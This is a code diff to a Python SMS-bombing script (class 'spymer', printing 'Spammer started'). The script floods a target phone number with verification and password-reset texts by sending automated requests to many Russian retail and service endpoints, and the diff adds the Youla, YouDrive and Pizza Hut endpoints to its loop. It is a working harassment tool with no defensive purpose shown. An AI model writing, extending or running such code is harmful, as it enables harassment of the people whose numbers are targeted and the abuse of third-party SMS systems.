@@ -32,7 +32,8 @@ class spymer:
 		iteration = 0			
 		_phone9 = _phone[1:]
 		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
-		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
+		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
 		print showstatus(wrapsbrace('info', True) + ('Send SMS to: +{}').format(_phone))
 		print 'Spammer started.\nIf you want to stop - press Ctrl+Z.'
 		i = 1
@@ -51,5 +52,9 @@ class spymer:
 			wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
 			mts = requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': _phone}, headers={})
 			ostin = requests.get('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.js', data={'type':'sendConfirmCode', 'phoneNumber': _phoneOstin})
+			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
+			youdrive = requests.post('http://youdrive.today/signup/phone', data={'phone': _phone, 'phone_code':'7'})			
+			pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
+
 spammer = spymer()
 spammer.main()
